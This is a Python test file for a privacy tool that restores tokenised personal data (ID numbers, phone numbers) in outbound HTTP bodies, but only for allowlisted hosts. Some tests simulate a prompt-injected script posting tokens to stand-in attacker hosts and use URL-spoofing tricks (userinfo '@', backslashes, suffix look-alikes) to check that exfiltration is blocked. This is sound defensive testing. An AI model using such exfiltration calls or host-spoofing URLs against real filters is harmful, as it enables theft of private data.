"""HTTP-layer egress restore: the body a script POSTs to an external API gets its
⟦tokens⟧ restored before it leaves — covering ad-hoc scripts with no shared mailer."""
import os
import sys
import types

import pytest

from hermescloak.durable_vault import DurableVault


def _seed(home, real, etype):
    vdir = os.path.join(home, "cloak", "vaults"); os.makedirs(vdir, exist_ok=True)
    with open(os.path.join(home, "cloak", "egress_hosts"), "w", encoding="utf-8") as f:
        f.write("# hosts egress may restore for\nmicrosoft.com\napi.example.com\nx\n")
    v = DurableVault(DurableVault.path_for(vdir, home))
    tok = v.tokenize(real, etype); v.save()
    return tok


@pytest.fixture
def fake_requests(monkeypatch):
    """Install a stand-in `requests` module that records the final body, then patch it."""
    sent = {}
    mod = types.ModuleType("requests")
    sessions = types.ModuleType("requests.sessions")

    class Session:
        def request(self, method, url, **kwargs):
            sent["url"] = url; sent["json"] = kwargs.get("json"); sent["data"] = kwargs.get("data")
            return {"status": 202}

    sessions.Session = Session
    mod.sessions = sessions
    monkeypatch.setitem(sys.modules, "requests", mod)
    monkeypatch.setitem(sys.modules, "requests.sessions", sessions)
    # fresh install each test
    import hermescloak.integrations.requests_egress as re_mod
    re_mod._INSTALLED = False
    return mod, sessions, sent, re_mod


def test_restores_json_body_before_send(tmp_path, fake_requests):
    home = str(tmp_path)
    tok = _seed(home, "100000009", "מזהה")
    mod, sessions, sent, re_mod = fake_requests
    assert re_mod.install(home) is True

    L, R = chr(0x27E6), chr(0x27E7)                       # the chr()-built token, as in the field bug
    body = {"message": {"body": {"content": f"ת\"ז: {L}מזהה_1{R}"}}}
    sessions.Session().request("POST", "https://graph.microsoft.com/v1.0/sendMail", json=body)

    blob = str(sent["json"])
    assert "100000009" in blob and "⟦" not in blob       # restored in the outbound body


def test_restores_str_data_body(tmp_path, fake_requests):
    home = str(tmp_path)
    _seed(home, "050-1234567", "טלפון")
    mod, sessions, sent, re_mod = fake_requests
    re_mod.install(home)
    sessions.Session().request("POST", "https://api.example.com/x", data="phone=⟦טלפון_1⟧")
    assert "050-1234567" in sent["data"] and "⟦" not in sent["data"]


def test_untouched_when_no_token(tmp_path, fake_requests):
    home = str(tmp_path); _seed(home, "x", "לקוח")
    mod, sessions, sent, re_mod = fake_requests
    re_mod.install(home)
    body = {"message": "no tokens here"}
    sessions.Session().request("POST", "https://x/y", json=body)
    assert sent["json"] == body                           # unchanged object/content


def test_restores_base64_mime_calendar_body(tmp_path, fake_requests):
    """Graph MIME sendMail base64-encodes the whole MIME (text/calendar with a phone token)
    into data= — the literal ⟦ is hidden. The patch must decode, restore, re-encode."""
    import base64
    home = str(tmp_path)
    _seed(home, "050-1234567", "טלפון")
    mod, sessions, sent, re_mod = fake_requests
    re_mod.install(home)
    L, R = chr(0x27E6), chr(0x27E7)
    mime = ('Content-Type: text/calendar; method="REQUEST"\r\n\r\n'
            'BEGIN:VCALENDAR\r\nDESCRIPTION:ליצירת קשר ' + L + 'טלפון_1' + R + '\r\nEND:VCALENDAR')
    encoded = base64.b64encode(mime.encode("utf-8"))          # bytes, exactly like calendar_mime_graph.py
    sessions.Session().request("POST", "https://graph.microsoft.com/v1.0/users/x/sendMail",
                               headers={"Content-Type": "text/plain"}, data=encoded)
    out = base64.b64decode(sent["data"]).decode("utf-8")      # what really went out, decoded back
    assert "050-1234567" in out and "⟦" not in out            # phone restored inside the base64 MIME


def test_kill_switch(tmp_path, fake_requests, monkeypatch):
    home = str(tmp_path); _seed(home, "100000009", "מזהה")
    mod, sessions, sent, re_mod = fake_requests
    monkeypatch.setenv("HERMESCLOAK_EGRESS_OFF", "1")
    assert re_mod.install(home) is False                  # disabled → not patched
    sessions.Session().request("POST", "https://x", json={"c": "⟦מזהה_1⟧"})
    assert sent["json"] == {"c": "⟦מזהה_1⟧"}              # token left as-is (patch off)


def test_json_body_value_with_quotes_and_backslash(tmp_path, fake_requests):
    """A restored value containing `"` or `\\` used to break the re-parsed JSON dump, so the
    request silently went out still carrying the token."""
    home = str(tmp_path)
    real = 'Acme "Holdings" C:\\clients'
    tok = _seed(home, real, "לקוח")
    _, sessions, sent, re_mod = fake_requests
    re_mod.install(home)
    sessions.Session().request("POST", "https://x", json={"to": [tok], "n": 3})
    assert sent["json"] == {"to": [real], "n": 3}


def test_unlisted_host_gets_tokens_not_values(tmp_path, fake_requests):
    """A prompt-injected script posting tokens to an attacker's host must not get real values."""
    home = str(tmp_path)
    tok = _seed(home, "100000009", "מזהה")
    mod, sessions, sent, re_mod = fake_requests
    re_mod.install(home)
    sessions.Session().request("POST", "https://evil.example.net/c", json={"q": tok})
    assert sent["json"] == {"q": tok}
    sessions.Session().request("POST", "https://microsoft.com.evil.net/c", data="q=" + tok)
    assert sent["data"] == "q=" + tok                        # suffix match is on whole labels
    audit = open(os.path.join(home, "cloak", "audit.log"), encoding="utf-8").read()
    assert "egress_blocked" in audit and "100000009" not in audit


def test_no_host_list_restores_nothing(tmp_path, fake_requests):
    home = str(tmp_path)
    tok = _seed(home, "100000009", "מזהה")
    os.remove(os.path.join(home, "cloak", "egress_hosts"))
    mod, sessions, sent, re_mod = fake_requests
    re_mod.install(home)
    sessions.Session().request("POST", "https://graph.microsoft.com/v1.0/sendMail", json={"c": tok})
    assert sent["json"] == {"c": tok}


def test_blocked_host_never_mutates_the_callers_data_dict(tmp_path, fake_requests):
    home = str(tmp_path)
    tok = _seed(home, "100000009", "מזהה")
    mod, sessions, sent, re_mod = fake_requests
    re_mod.install(home)
    body = {"q": tok}
    sessions.Session().request("POST", "https://evil.example/collect", data=body)
    assert sent["data"] == {"q": tok} and body == {"q": tok}


def test_url_tricks_never_count_as_an_allowed_host(tmp_path, fake_requests):
    home = str(tmp_path)
    tok = _seed(home, "100000009", "מזהה")
    mod, sessions, sent, re_mod = fake_requests
    re_mod.install(home)
    for url in ("https://evil.example\\@graph.microsoft.com/", "https://graph.microsoft.com@evil.example/",
                "https://user:pw@graph.microsoft.com/", "https://evil.example\\.microsoft.com/"):
        sessions.Session().request("POST", url, json={"c": tok})
        assert sent["json"] == {"c": tok}, url
    sessions.Session().request("POST", "https://GRAPH.Microsoft.com./v1.0/x", json={"c": tok})
    assert sent["json"] == {"c": "100000009"}              # case and a trailing dot are fine
